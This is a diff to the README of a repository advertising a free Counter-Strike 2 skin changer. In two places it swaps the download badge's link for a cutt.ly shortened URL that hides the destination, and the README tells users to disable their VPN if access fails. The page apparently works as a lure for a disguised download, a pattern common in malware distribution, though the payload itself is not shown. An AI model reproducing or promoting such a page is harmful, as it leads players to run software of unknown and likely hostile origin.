@@ -4,7 +4,7 @@
  
 **Description**: Transform your CS2 gameplay with the **CS2 Free Skin Changer**, offering free skins in 2025! This repository provides exclusive tutorials, resources, and tips to explore features like custom weapon skins, knives, and gloves. Download your free skin changer and join our vibrant community of CS2 players!  
 
-<a href="https://cs2-skin-free-changer.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/JrNtauRp" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
@@ -27,7 +27,7 @@ Upgrade your CS2 experience with these simple steps to set up the Free Skin Chan
 5. **Access Problems?** 🌐  
    If the package access fails, try disabling your VPN or switching browsers (e.g., Chrome, Firefox).  
 
-<a href="https://cs2-skin-free-changer.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/JrNtauRp" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
